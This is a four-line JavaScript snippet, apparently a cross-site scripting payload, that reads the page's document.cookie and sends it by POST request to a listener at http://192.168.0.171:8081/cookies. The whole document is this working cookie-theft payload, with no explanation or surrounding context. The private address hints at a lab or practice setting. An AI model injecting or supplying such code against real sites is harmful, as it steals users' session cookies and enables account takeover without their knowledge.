var server = "http://192.168.0.171:8081/cookies";
var x = new XMLHttpRequest();
x.open("POST", server, true);
x.send(document.cookie);

